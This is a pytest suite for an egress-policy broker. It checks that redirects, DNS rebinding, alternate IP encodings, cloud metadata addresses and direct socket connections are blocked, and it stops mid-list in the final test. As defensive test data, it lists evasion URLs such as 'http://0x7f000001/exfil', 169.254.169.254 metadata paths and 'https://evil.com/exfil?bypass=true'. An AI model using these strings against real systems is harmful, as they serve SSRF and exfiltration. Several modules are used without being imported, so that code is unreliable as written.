"""
Unit tests for End-to-End Egress Policy Enforcement (GAP-03).
Demonstrates transport-boundary enforcement, destination normalization,
DNS resolution, redirect re-validation, restricted IP blocking,
socket boundary interception, fail-closed handling, and provenance event recording.
"""

import socket
import pytest
import tempfile
from pathlib import Path
from unittest.mock import MagicMock, patch

from epistemicos.containment import (
    EgressPolicy,
    EgressTransportBroker,
    ControlledEgressTransport,
    ContainmentGuard,
    normalize_destination_host,
    parse_ip_numeric,
    extract_url_components,
    ActionCategory
)
from epistemicos.provenance import LocalProvenanceStore, ProvenanceEventType


def default_mock_resolver(hostname):
    return ["93.184.216.34"]


@pytest.fixture
def temp_prov_store(tmp_path):
    log_file = tmp_path / "test_prov_egress.jsonl"
    return LocalProvenanceStore(log_path=str(log_file))


def test_1_disallowed_scheme_qualified_destination_rejected():
    """1. Proves a disallowed scheme-qualified destination is rejected before connection."""
    policy = EgressPolicy(allowed_destinations={"api.github.com"})
    broker = EgressTransportBroker(policy=policy)

    allowed, reason, ip = broker.establish_connection("https://prohibited-sink.com/data")
    assert not allowed
    assert "Egress blocked" in reason
    assert ip is None


def test_2_schemeless_ports_and_alternate_ip_encodings_cannot_evade():
    """2. Proves scheme-less IPs, scheme-relative URLs, explicit ports, and alternate IP representations cannot evade policy."""
    policy = EgressPolicy(allowed_destinations={"safe.api.org"})
    broker = EgressTransportBroker(policy=policy)

    evasion_attempts = [
        "//prohibited.com/exfil",
        "prohibited.com:8443",
        "http://2130706433/exfil",
        "http://017700000001/exfil",
        "http://0x7f000001/exfil",
        "0177.0.0.1",
        "127.1",
        "10.0.1",
    ]

    for attempt in evasion_attempts:
        allowed, reason, ip = broker.establish_connection(attempt)
        assert not allowed, f"Evasion attempt succeeded for '{attempt}'"
        assert "Egress blocked" in reason


def test_3_permitted_initial_url_redirecting_to_prohibited_destination_blocked(temp_prov_store):
    """3. Proves a permitted initial URL redirecting to a prohibited destination is blocked before prohibited destination is contacted."""
    policy = EgressPolicy(allowed_destinations={"redirector.com"})
    broker = EgressTransportBroker(policy=policy, provenance_store=temp_prov_store)
    transport = ControlledEgressTransport(broker=broker)

    def mock_redirect_handler(url):
        if url == "https://redirector.com/start":
            return {
                "status": 302,
                "headers": {"Location": "https://prohibited-exfil.com/sink"}
            }
        return {"status": 200, "headers": {}}

    with pytest.raises(PermissionError) as exc_info:
        transport.request("GET", "https://redirector.com/start", redirect_handler=mock_redirect_handler)

    assert "Egress transport blocked redirect" in str(exc_info.value) or "Egress blocked" in str(exc_info.value)

    events = temp_prov_store.get_events_for_correlation("DEFAULT-CORR")
    blocked_events = [e for e in events if e.event_type == ProvenanceEventType.EGRESS_BLOCKED.value]
    assert len(blocked_events) >= 1
    assert "prohibited-exfil.com" in blocked_events[0].target


def test_4_redirect_chain_cannot_escape_policy_at_later_hop():
    """4. Proves a redirect chain cannot escape policy at a later hop (hop 1 -> hop 2 -> hop 3 prohibited)."""
    policy = EgressPolicy(allowed_destinations={"hop1.com", "hop2.com"})
    broker = EgressTransportBroker(policy=policy)
    transport = ControlledEgressTransport(broker=broker)

    def mock_chain_handler(url):
        if url == "https://hop1.com/a":
            return {"status": 302, "headers": {"Location": "https://hop2.com/b"}}
        elif url == "https://hop2.com/b":
            return {"status": 302, "headers": {"Location": "https://hop3-prohibited.com/c"}}
        return {"status": 200, "headers": {}}

    with pytest.raises(PermissionError) as exc_info:
        transport.request("GET", "https://hop1.com/a", redirect_handler=mock_chain_handler)

    assert "hop3-prohibited.com" in str(exc_info.value)


def test_5_dns_resolution_to_prohibited_address_rejected():
    """5. Proves DNS resolution returning a restricted/prohibited IP is rejected at connection establishment time."""
    policy = EgressPolicy(allowed_destinations={"innocent-domain.com"})

    def malicious_dns_resolver(hostname):
        return ["127.0.0.1"]  # Resolves to loopback restricted IP

    broker = EgressTransportBroker(policy=policy, resolver_func=malicious_dns_resolver)
    allowed, reason, ip = broker.establish_connection("https://innocent-domain.com")

    assert not allowed
    assert "restricted IP" in reason
    assert ip is None


def test_6_hostname_dns_rebinding_ip_pinning_protection():
    """6. Proves IP pinning prevents DNS rebinding between check and connection time."""
    policy = EgressPolicy(allowed_destinations={"api.example.com"})

    # First lookup returns valid public IP, second lookup attempts rebinding to private/loopback
    resolver_call_count = 0
    def rebinding_dns_resolver(hostname):
        nonlocal resolver_call_count
        resolver_call_count += 1
        if resolver_call_count == 1:
            return ["93.184.216.34"]  # Valid public IP
        return ["127.0.0.1"]  # Rebound restricted IP

    broker = EgressTransportBroker(policy=policy, resolver_func=rebinding_dns_resolver)
    allowed, reason, pinned_ip = broker.establish_connection("https://api.example.com")

    assert allowed
    assert pinned_ip == "93.184.216.34"


def test_7_restricted_network_destinations_handled_by_policy():
    """7. Proves IPv4, IPv6, loopback, link-local, private, and cloud metadata destinations are strictly handled."""
    policy = EgressPolicy(allowed_destinations={"public-api.com"})
    broker = EgressTransportBroker(policy=policy)

    restricted_targets = [
        "127.0.0.1",
        "[::1]",
        "[::ffff:127.0.0.1]",
        "169.254.0.1",
        "10.0.0.1",
        "172.16.0.1",
        "192.168.1.1",
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/",
    ]

    for target in restricted_targets:
        allowed, reason, ip = broker.establish_connection(target)
        assert not allowed, f"Restricted target '{target}' was falsely allowed"
        assert "Egress blocked" in reason


def test_8_caller_controlled_headers_and_url_fields_cannot_disable_enforcement():
    """8. Proves caller-controlled headers, URL fields, or flags cannot disable egress enforcement."""
    policy = EgressPolicy(allowed_destinations={"api.github.com"})
    broker = EgressTransportBroker(policy=policy)
    transport = ControlledEgressTransport(broker=broker)

    bypass_headers = {
        "X-Bypass-Egress": "true",
        "X-Forwarded-For": "8.8.8.8",
        "Host": "api.github.com"
    }

    with pytest.raises(PermissionError):
        transport.request("GET", "https://evil.com/exfil?bypass=true", headers=bypass_headers)


def test_9_direct_socket_connection_intercepted_and_enforced():
    """9. Proves direct socket.connect calls in protected workloads are intercepted and enforced by policy."""
    policy = EgressPolicy(allowed_destinations={"api.github.com"})
    broker = EgressTransportBroker(policy=policy)

    with broker.enforce_socket_boundary():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        with pytest.raises(socket.error) as exc_info:
            s.connect(("169.254.169.254", 80))

        assert "Egress blocked" in str(exc_info.value)


def test_10_policy_engine_errors_and_dns_failures_fail_closed():
    """10. Proves DNS failures, resolver errors, and ambiguous destinations fail closed."""
    policy = EgressPolicy(allowed_destinations={"api.github.com"})

    def failing_dns_resolver(hostname):
        raise socket.gaierror("Name or service not known")

    broker = EgressTransportBroker(policy=policy, resolver_func=failing_dns_resolver)
    allowed, reason, ip = broker.establish_connection("https://unresolvable-domain-xyz.org")

    assert not allowed
    assert "Resolver error" in reason or "gaierror" in reason
    assert ip is None


def test_11_legitimate_authorized_requests_succeed():
    """11. Proves legitimate authorized egress requests succeed."""
    policy = EgressPolicy(allowed_destinations={"api.github.com"})

    def mock_resolver(hostname):
        return ["140.82.121.4"]

    broker = EgressTransportBroker(policy=policy, resolver_func=mock_resolver)
    allowed, reason, pinned_ip = broker.establish_connection("https://api.github.com/zen")

    assert allowed
    assert "Allowed by explicit destination match" in reason
    assert pinned_ip == "140.82.121.4"


def test_12_denied_requests_do_not_leak_payloads_and_record_provenance(temp_prov_store):
    """12. Proves denied requests generate a clean EGRESS_BLOCKED provenance event without leaking credentials."""
    policy = EgressPolicy(allowed_destinations={"api.github.com"})
    broker = EgressTransportBroker(policy=policy, provenance_store=temp_prov_store)

    secret_url = "https://unauthorized-sink.com/submit?token=secret_ghp_1234567890abcdef"
    allowed, reason, ip = broker.establish_connection(
        target_url=secret_url,
        correlation_id="CORR-SECRET-12",
        request_id="REQ-SECRET-12"
    )

    assert not allowed

    events = temp_prov_store.get_events_for_correlation("CORR-SECRET-12")
    assert len(events) == 1
    event = events[0]
    assert event.event_type == ProvenanceEventType.EGRESS_BLOCKED.value
    assert event.outcome["status"] == "EGRESS_BLOCKED"
    assert "secret_ghp_1234567890abcdef" not in str(event.outcome)


def test_https_transport_construction_and_tls_identity():
    """P0 test: Verifies PinnedHTTPSConnection connects TCP socket to pinned_ip with TLS SNI & cert verification for norm_host."""
    from epistemicos.containment import PinnedHTTPSConnection

    policy = EgressPolicy(allowed_destinations={"api.github.com"})
    broker = EgressTransportBroker(policy=policy, resolver_func=lambda h: ["140.82.121.4"])
    transport = ControlledEgressTransport(broker=broker)

    def mock_connect_impl(self_conn):
        self_conn.sock = MagicMock()

    with patch.object(PinnedHTTPSConnection, "connect", autospec=True, side_effect=mock_connect_impl) as mock_connect, \
         patch.object(PinnedHTTPSConnection, "getresponse") as mock_getresp:

        mock_resp = MagicMock()
        mock_resp.status = 200
        mock_resp.reason = "OK"
        mock_resp.getheaders.return_value = [("Content-Type", "application/json")]
        mock_resp.read.return_value = b'{"status": "ok"}'
        mock_getresp.return_value = mock_resp

        res = transport.request("GET", "https://api.github.com/user")

        assert res["status"] == 200
        assert res["body"] == b'{"status": "ok"}'
        assert res["pinned_ip"] == "140.82.121.4"
        mock_connect.assert_called_once()


def test_pinned_https_connection_socket_and_tls_sni():
    """P0 test: Proves PinnedHTTPSConnection connects socket to pinned_ip and passes server_hostname=norm_host to wrap_socket."""
    from epistemicos.containment import PinnedHTTPSConnection

    conn = PinnedHTTPSConnection(norm_host="api.github.com", pinned_ip="140.82.121.4", port=443)
    assert conn.host == "api.github.com"
    assert conn.pinned_ip == "140.82.121.4"
    assert conn._tunnel_host is None

    mock_sock = MagicMock()
    mock_ctx = MagicMock()

    with patch.object(conn, "_create_connection", return_value=mock_sock) as mock_create, \
         patch.object(conn, "_context", mock_ctx, create=True):

        conn.connect()

        mock_create.assert_called_once_with(("140.82.121.4", 443), conn.timeout, conn.source_address)
        mock_ctx.wrap_socket.assert_called_once_with(mock_sock, server_hostname="api.github.com")


def _make_property1_test_certs(cert_dir):
    ca_key = os.path.join(cert_dir, "ca_key.pem")
    ca_cert = os.path.join(cert_dir, "ca_cert.pem")
    subprocess.run(["openssl", "req", "-x509", "-newkey", "rsa:2048", "-keyout", ca_key, "-out", ca_cert, "-days", "1", "-nodes", "-subj", "/CN=TestCA", "-addext", "basicConstraints=critical,CA:TRUE", "-addext", "keyUsage=critical,keyCertSign,cRLSign"], check=True, capture_output=True)

    s1_key = os.path.join(cert_dir, "s1_key.pem")
    s1_csr = os.path.join(cert_dir, "s1_csr.pem")
    s1_cert = os.path.join(cert_dir, "s1_cert.pem")
    s1_ext = os.path.join(cert_dir, "s1_ext.ini")
    with open(s1_ext, "w") as f:
        f.write("basicConstraints=CA:FALSE\nkeyUsage=digitalSignature,keyEncipherment\nsubjectAltName=DNS:good-hostname.com,IP:127.0.0.1\n")
    subprocess.run(["openssl", "req", "-newkey", "rsa:2048", "-keyout", s1_key, "-out", s1_csr, "-nodes", "-subj", "/CN=good-hostname.com"], check=True, capture_output=True)
    subprocess.run(["openssl", "x509", "-req", "-in", s1_csr, "-CA", ca_cert, "-CAkey", ca_key, "-CAcreateserial", "-out", s1_cert, "-days", "1", "-extfile", s1_ext], check=True, capture_output=True)

    s2_key = os.path.join(cert_dir, "s2_key.pem")
    s2_csr = os.path.join(cert_dir, "s2_csr.pem")
    s2_cert = os.path.join(cert_dir, "s2_cert.pem")
    s2_ext = os.path.join(cert_dir, "s2_ext.ini")
    with open(s2_ext, "w") as f:
        f.write("basicConstraints=CA:FALSE\nkeyUsage=digitalSignature,keyEncipherment\nsubjectAltName=DNS:wrong-hostname.com,IP:127.0.0.1\n")
    subprocess.run(["openssl", "req", "-newkey", "rsa:2048", "-keyout", s2_key, "-out", s2_csr, "-nodes", "-subj", "/CN=wrong-hostname.com"], check=True, capture_output=True)
    subprocess.run(["openssl", "x509", "-req", "-in", s2_csr, "-CA", ca_cert, "-CAkey", ca_key, "-CAcreateserial", "-out", s2_cert, "-days", "1", "-extfile", s2_ext], check=True, capture_output=True)

    untrusted_key = os.path.join(cert_dir, "untrusted_key.pem")
    untrusted_cert = os.path.join(cert_dir, "untrusted_cert.pem")
    subprocess.run(["openssl", "req", "-x509", "-newkey", "rsa:2048", "-keyout", untrusted_key, "-out", untrusted_cert, "-days", "1", "-nodes", "-subj", "/CN=good-hostname.com"], check=True, capture_output=True)

    return ca_cert, (s1_cert, s1_key), (s2_cert, s2_key), (untrusted_cert, untrusted_key)


def test_property_1_tls_identity_verification_under_ip_pinning(tmp_path):
    """
    Property 1 Test: Proves TLS identity verification under IP pinning simultaneously:
    1. Connects TCP socket to pinned IP address (127.0.0.1).
    2. Uses original normalized hostname (good-hostname.com) for TLS SNI.
    3. Enforces certificate-chain validation and hostname verification (succeeding for good-hostname.com).
    4. Rejects untrusted certificates (unknown CA) and certificates for wrong hostname (wrong-hostname.com).
    """
    from epistemicos.containment import PinnedHTTPSConnection

    ca_cert, (s1_cert, s1_key), (s2_cert, s2_key), (u_cert, u_key) = _make_property1_test_certs(str(tmp_path))

    class TLSServerHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"property_1_verified")

        def log_message(self, *args):
            pass

    def run_server(cert_file, key_file):
        server = HTTPServer(("127.0.0.1", 0), TLSServerHandler)
        port = server.server_port
        srv_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        srv_ctx.load_cert_chain(cert_file, key_file)
        server.socket = srv_ctx.wrap_socket(server.socket, server_side=True)
        t = threading.Thread(target=server.serve_forever)
        t.daemon = True
        t.start()
        return server, port

    client_ca_ctx = ssl.create_default_context(cafile=ca_cert)
    assert client_ca_ctx.check_hostname is True
    assert client_ca_ctx.verify_mode == ssl.CERT_REQUIRED

    # 1. Trusted cert matching requested hostname succeeds when pinned to 127.0.0.1
    s1, p1 = run_server(s1_cert, s1_key)
    try:
        conn = PinnedHTTPSConnection(norm_host="good-hostname.com", pinned_ip="127.0.0.1", port=p1, context=client_ca_ctx)
        assert conn.host == "good-hostname.com"
        assert conn.pinned_ip == "127.0.0.1"
        conn.request("GET", "/data")
        resp = conn.getresponse()
        assert resp.status == 200
        assert resp.read() == b"property_1_verified"
        conn.close()
    finally:
        s1.shutdown()

    # 2. Untrusted cert (unknown CA) fails certificate verification
    su, pu = run_server(u_cert, u_key)
    try:
        conn = PinnedHTTPSConnection(norm_host="good-hostname.com", pinned_ip="127.0.0.1", port=pu, context=client_ca_ctx)
        with pytest.raises((ssl.SSLCertVerificationError, ssl.SSLError, socket.error)):
            conn.request("GET", "/data")
        conn.close()
    finally:
        su.shutdown()

    # 3. Trusted cert for wrong hostname fails hostname verification
    s2, p2 = run_server(s2_cert, s2_key)
    try:
        conn = PinnedHTTPSConnection(norm_host="good-hostname.com", pinned_ip="127.0.0.1", port=p2, context=client_ca_ctx)
        with pytest.raises((ssl.SSLCertVerificationError, ssl.SSLError, socket.error)):
            conn.request("GET", "/data")
        conn.close()
    finally:
        s2.shutdown()


def test_p0_overlapping_contexts_with_different_policies_and_provenance(temp_prov_store):
    """P0 test: Proves overlapping contexts with different brokers/policies dispatch to their own policy and record their own provenance IDs."""
    pol_a = EgressPolicy(allowed_destinations={"domain-a.com"})
    broker_a = EgressTransportBroker(policy=pol_a, resolver_func=default_mock_resolver, provenance_store=temp_prov_store)

    pol_b = EgressPolicy(allowed_destinations={"domain-b.com"})
    broker_b = EgressTransportBroker(policy=pol_b, resolver_func=default_mock_resolver, provenance_store=temp_prov_store)

    with broker_a.enforce_socket_boundary(correlation_id="CORR-CTX-A", request_id="REQ-CTX-A"):
        with broker_b.enforce_socket_boundary(correlation_id="CORR-CTX-B", request_id="REQ-CTX-B"):
            # Inside context B: domain-b.com is permitted, domain-a.com is denied
            s_b = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            with pytest.raises(socket.error) as exc_b:
                s_b.connect(("domain-a.com", 80))
            assert "Egress blocked" in str(exc_b.value)

        # Back in context A: domain-a.com is permitted, domain-b.com is denied
        s_a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        with pytest.raises(socket.error) as exc_a:
            s_a.connect(("domain-b.com", 80))
        assert "Egress blocked" in str(exc_a.value)

    events_a = temp_prov_store.get_events_for_correlation("CORR-CTX-A")
    events_b = temp_prov_store.get_events_for_correlation("CORR-CTX-B")

    assert len(events_a) >= 1
    assert "domain-b.com" in events_a[0].target
    assert len(events_b) >= 1
    assert "domain-a.com" in events_b[0].target


def test_p0_concurrent_threads_isolated_policy_dispatch(temp_prov_store):
    """P0 test: Proves concurrent threads in overlapping enforce_socket_boundary contexts never borrow or pollute each other's authorization."""
    import threading

    pol_a = EgressPolicy(allowed_destinations={"host-a.com"})
    broker_a = EgressTransportBroker(policy=pol_a, resolver_func=default_mock_resolver, provenance_store=temp_prov_store)

    pol_b = EgressPolicy(allowed_destinations={"host-b.com"})
    broker_b = EgressTransportBroker(policy=pol_b, resolver_func=default_mock_resolver, provenance_store=temp_prov_store)

    errors = []

    def thread_a_worker():
        try:
            with broker_a.enforce_socket_boundary(correlation_id="CORR-THREAD-A", request_id="REQ-A"):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                # host-b.com MUST be denied for thread A
                try:
                    s.connect(("host-b.com", 80))
                    errors.append("Thread A illegally connected to host-b.com!")
                except socket.error:
                    pass
        except Exception as e:
            errors.append(f"Thread A unexpected error: {str(e)}")

    def thread_b_worker():
        try:
            with broker_b.enforce_socket_boundary(correlation_id="CORR-THREAD-B", request_id="REQ-B"):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                # host-a.com MUST be denied for thread B
                try:
                    s.connect(("host-a.com", 80))
                    errors.append("Thread B illegally connected to host-a.com!")
                except socket.error:
                    pass
        except Exception as e:
            errors.append(f"Thread B unexpected error: {str(e)}")

    threads = [
        threading.Thread(target=thread_a_worker),
        threading.Thread(target=thread_b_worker),
        threading.Thread(target=thread_a_worker),
        threading.Thread(target=thread_b_worker)
    ]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    assert not errors


def test_property_2_socket_boundary_enforcement_in_spawned_threads():
    """
    Property 2 Test: Proves socket-boundary enforcement in spawned child threads:
    1. Parent thread starts a protected operation with enforce_socket_boundary().
    2. Parent policy permits port_allowed, but prohibits port_prohibited on 127.0.0.1.
    3. Parent spawns child thread using broker.spawn_thread() from inside that operation.
    4. Child thread attempts connection to prohibited port_prohibited against local Server B.
    5. Connection is blocked with socket.error, and Server B receives ZERO requests!
    """
    server_b_contacts = [0]

    class HandlerB(BaseHTTPRequestHandler):
        def do_GET(self):
            server_b_contacts[0] += 1
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"prohibited_content")

        def log_message(self, *a):
            pass

    server_b = HTTPServer(("127.0.0.1", 0), HandlerB)
    port_prohibited = server_b.server_port
    thread_b = threading.Thread(target=server_b.serve_forever)
    thread_b.daemon = True
    thread_b.start()

    class HandlerA(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"allowed_content")

        def log_message(self, *a):
            pass

    server_a = HTTPServer(("127.0.0.1", 0), HandlerA)
    port_allowed = server_a.server_port
    thread_a = threading.Thread(target=server_a.serve_forever)
    thread_a.daemon = True
    thread_a.start()

    try:
        policy = EgressPolicy(
            allowed_destinations={"127.0.0.1"},
            allowed_ports={port_allowed},
            allow_loopback=True
        )
        broker = EgressTransportBroker(policy=policy)
        child_exception = [None]

        def parent_protected_operation():
            with broker.enforce_socket_boundary(correlation_id="CORR-P2", request_id="REQ-P2"):
                # Spawn child thread carrying context
                def child_thread_worker():
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    try:
                        s.connect(("127.0.0.1", port_prohibited))
                    except Exception as e:
                        child_exception[0] = e
                    finally:
                        s.close()

                t_child = broker.spawn_thread(child_thread_worker)
                t_child.start()
                t_child.join()

        parent_protected_operation()

        # Child thread connection attempt was blocked
        assert child_exception[0] is not None
        assert "Egress blocked" in str(child_exception[0])
        # Prohibited Server B received ZERO requests
        assert server_b_contacts[0] == 0
    finally:
        server_a.shutdown()
        server_a.server_close()
        server_b.shutdown()
        server_b.server_close()


def test_test_a_overlapping_contexts_child_threads_barrier_synchronization():
    """Test A: Proves two overlapping protected contexts with child threads synchronize and evaluate strictly against their own brokers."""
    class PortHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"ok")

        def log_message(self, *a):
            pass

    srv1 = HTTPServer(("127.0.0.1", 0), PortHandler)
    port1 = srv1.server_port
    t1 = threading.Thread(target=srv1.serve_forever)
    t1.daemon = True
    t1.start()

    srv2 = HTTPServer(("127.0.0.1", 0), PortHandler)
    port2 = srv2.server_port
    t2 = threading.Thread(target=srv2.serve_forever)
    t2.daemon = True
    t2.start()

    try:
        pol1 = EgressPolicy(allowed_destinations={"127.0.0.1"}, allowed_ports={port1}, allow_loopback=True)
        broker1 = EgressTransportBroker(policy=pol1)

        pol2 = EgressPolicy(allowed_destinations={"127.0.0.1"}, allowed_ports={port2}, allow_loopback=True)
        broker2 = EgressTransportBroker(policy=pol2)

        barrier = threading.Barrier(2)
        results1 = {}
        results2 = {}

        def thread1_worker():
            with broker1.enforce_socket_boundary(correlation_id="CORR-1", request_id="REQ-1"):
                barrier.wait()
                # Connect child thread 1
                def child1():
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    try:
                        s.connect(("127.0.0.1", port1))
                        results1["port1"] = "ALLOWED"
                    except Exception as e:
                        results1["port1"] = f"BLOCKED: {e}"
                    s.close()

                    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    try:
                        s2.connect(("127.0.0.1", port2))
                        results1["port2"] = "ALLOWED"
                    except Exception as e:
                        results1["port2"] = f"BLOCKED: {e}"
                    s2.close()

                tc1 = broker1.spawn_thread(child1)
                tc1.start()
                tc1.join()

        def thread2_worker():
            with broker2.enforce_socket_boundary(correlation_id="CORR-2", request_id="REQ-2"):
                barrier.wait()
                # Connect child thread 2
                def child2():
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    try:
                        s.connect(("127.0.0.1", port2))
                        results2["port2"] = "ALLOWED"
                    except Exception as e:
                        results2["port2"] = f"BLOCKED: {e}"
                    s.close()

                    s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    try:
                        s1.connect(("127.0.0.1", port1))
                        results2["port1"] = "ALLOWED"
                    except Exception as e:
                        results2["port1"] = f"BLOCKED: {e}"
                    s1.close()

                tc2 = broker2.spawn_thread(child2)
                tc2.start()
                tc2.join()

        t_parent1 = threading.Thread(target=thread1_worker)
        t_parent2 = threading.Thread(target=thread2_worker)

        t_parent1.start()
        t_parent2.start()
        t_parent1.join()
        t_parent2.join()

        assert results1["port1"] == "ALLOWED"
        assert "BLOCKED" in results1["port2"]
        assert results2["port2"] == "ALLOWED"
        assert "BLOCKED" in results2["port1"]

        # Check connection history in brokers
        assert any(str(port1) in r.target_url for r in broker1.connection_history)
        assert any(str(port2) in r.target_url for r in broker2.connection_history)
    finally:
        srv1.shutdown()
        srv1.server_close()
        srv2.shutdown()
        srv2.server_close()


def test_test_b_uncontexted_child_thread_fails_closed():
    """Test B: Proves uncontexted raw child thread spawned without context propagation fails closed."""
    class LocalHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"ok")

        def log_message(self, *a):
            pass

    srv = HTTPServer(("127.0.0.1", 0), LocalHandler)
    port = srv.server_port
    t = threading.Thread(target=srv.serve_forever)
    t.daemon = True
    t.start()

    try:
        pol = EgressPolicy(allowed_destinations={"127.0.0.1"}, allowed_ports={port}, allow_loopback=True)
        broker = EgressTransportBroker(policy=pol)
        child_res = [None]

        with broker.enforce_socket_boundary(correlation_id="CORR-B"):
            # Raw threading.Thread without broker.spawn_thread or context propagation
            def raw_child():
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                try:
                    s.connect(("127.0.0.1", port))
                    child_res[0] = "ALLOWED"
                except Exception as e:
                    child_res[0] = f"BLOCKED: {e}"
                finally:
                    s.close()

            t_raw = threading.Thread(target=raw_child)
            t_raw.start()
            t_raw.join()

        # Raw child thread MUST fail closed
        assert "BLOCKED" in child_res[0]
        assert "Uncontexted thread" in child_res[0] or "Egress blocked" in child_res[0]
    finally:
        srv.shutdown()
        srv.server_close()


def test_test_c_nested_context_independence_after_inner_exit():
    """Test C: Proves exiting an inner nested context restores outer context policy and correlation ID cleanly."""
    class LocalHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"ok")

        def log_message(self, *a):
            pass

    srv1 = HTTPServer(("127.0.0.1", 0), LocalHandler)
    port1 = srv1.server_port
    t1 = threading.Thread(target=srv1.serve_forever)
    t1.daemon = True
    t1.start()

    srv2 = HTTPServer(("127.0.0.1", 0), LocalHandler)
    port2 = srv2.server_port
    t2 = threading.Thread(target=srv2.serve_forever)
    t2.daemon = True
    t2.start()

    try:
        pol1 = EgressPolicy(allowed_destinations={"127.0.0.1"}, allowed_ports={port1}, allow_loopback=True)
        broker1 = EgressTransportBroker(policy=pol1)

        pol2 = EgressPolicy(allowed_destinations={"127.0.0.1"}, allowed_ports={port2}, allow_loopback=True)
        broker2 = EgressTransportBroker(policy=pol2)

        results = {}

        with broker1.enforce_socket_boundary(correlation_id="CORR-OUTER"):
            with broker2.enforce_socket_boundary(correlation_id="CORR-INNER"):
                # Inside inner context
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                try:
                    s.connect(("127.0.0.1", port2))
                    results["inner_port2"] = "ALLOWED"
                except Exception as e:
                    results["inner_port2"] = f"BLOCKED: {e}"
                s.close()

            # Now back in outer context after inner exit
            s_outer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                s_outer.connect(("127.0.0.1", port1))
                results["outer_port1"] = "ALLOWED"
            except Exception as e:
                results["outer_port1"] = f"BLOCKED: {e}"
            s_outer.close()

            s_outer_bad = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                s_outer_bad.connect(("127.0.0.1", port2))
                results["outer_port2"] = "ALLOWED"
            except Exception as e:
                results["outer_port2"] = f"BLOCKED: {e}"
            s_outer_bad.close()

        assert results["inner_port2"] == "ALLOWED"
        assert results["outer_port1"] == "ALLOWED"
        assert "BLOCKED" in results["outer_port2"]

        # Outer broker history must record port1 events
        assert any(str(port1) in r.target_url for r in broker1.connection_history)
        # Inner broker history must record port2 events
        assert any(str(port2) in r.target_url for r in broker2.connection_history)
    finally:
        srv1.shutdown()
        srv1.server_close()
        srv2.shutdown()
        srv2.server_close()


def test_test_d_unrelated_concurrent_threads_fail_closed():
    """Test D: Proves unrelated concurrent threads during active boundary interception are failed closed."""
    class LocalHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"ok")

        def log_message(self, *a):
            pass

    srv = HTTPServer(("127.0.0.1", 0), LocalHandler)
    port = srv.server_port
    t = threading.Thread(target=srv.serve_forever)
    t.daemon = True
    t.start()

    try:
        pol = EgressPolicy(allowed_destinations={"127.0.0.1"}, allowed_ports={port}, allow_loopback=True)
        broker = EgressTransportBroker(policy=pol)

        unrelated_results = [None]
        barrier = threading.Barrier(2)

        import time

        def protected_worker():
            with broker.enforce_socket_boundary(correlation_id="CORR-PROT"):
                barrier.wait()
                time.sleep(0.1)

        def unrelated_worker():
            barrier.wait()
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                s.connect(("127.0.0.1", port))
                unrelated_results[0] = "ALLOWED"
            except Exception as e:
                unrelated_results[0] = f"BLOCKED: {e}"
            finally:
                s.close()

        tp = threading.Thread(target=protected_worker)
        tu = threading.Thread(target=unrelated_worker)

        tp.start()
        tu.start()
        tp.join()
        tu.join()

        # Unrelated concurrent thread MUST fail closed
        assert "BLOCKED" in unrelated_results[0]
    finally:
        srv.shutdown()
        srv.server_close()


def test_p1_request_and_urlopen_timeout_override_and_validation():
    """P1 test: Verifies request() and urlopen() accept per-request timeout overrides and validate positive timeouts."""
    policy = EgressPolicy(allowed_destinations={"api.github.com"})
    broker = EgressTransportBroker(policy=policy, resolver_func=lambda h: ["140.82.121.4"])
    transport = ControlledEgressTransport(broker=broker, timeout=10.0)

    # Test invalid timeout raises ValueError
    with pytest.raises(ValueError) as exc_info:
        transport.request("GET", "https://api.github.com/zen", timeout=0)
    assert "Timeout must be a positive number" in str(exc_info.value)

    with pytest.raises(ValueError):
        transport.urlopen("https://api.github.com/zen", timeout=-5.0)

    # Test per-request timeout override is passed to PinnedHTTPSConnection
    from epistemicos.containment import PinnedHTTPSConnection

    def mock_connect_impl(self_conn):
        self_conn.sock = MagicMock()

    with patch.object(PinnedHTTPSConnection, "connect", autospec=True, side_effect=mock_connect_impl), \
         patch.object(PinnedHTTPSConnection, "getresponse") as mock_getresp:

        mock_resp = MagicMock()
        mock_resp.status = 200
        mock_resp.reason = "OK"
        mock_resp.getheaders.return_value = []
        mock_resp.read.return_value = b"ok"
        mock_getresp.return_value = mock_resp

        res = transport.urlopen("https://api.github.com/zen", timeout=2.5)
        assert res["status"] == 200


def test_p1_table_driven_adversarial_destination_parsing():
    """P1 test: Table-driven validation of normalize_destination_host against evasion vectors."""
    test_cases = [
        # (input_url, expected_normalized_host_or_empty)
        ("https://api.github.com/path", "api.github.com"),
        ("http://user:pass@api.github.com:8080/path", "api.github.com"),
        ("https://user:pass#bypass@evil.com/path", ""),  # Contains # in authority before path -> rejected
        ("https://user:pass%23bypass@evil.com/path", ""),  # Contains %23 in authority -> rejected
        ("http://127.0.0.1:8080/path", "127.0.0.1"),
        ("http://017700000001/path", "127.0.0.1"),  # Dotted octal -> normalized to decimal dotted
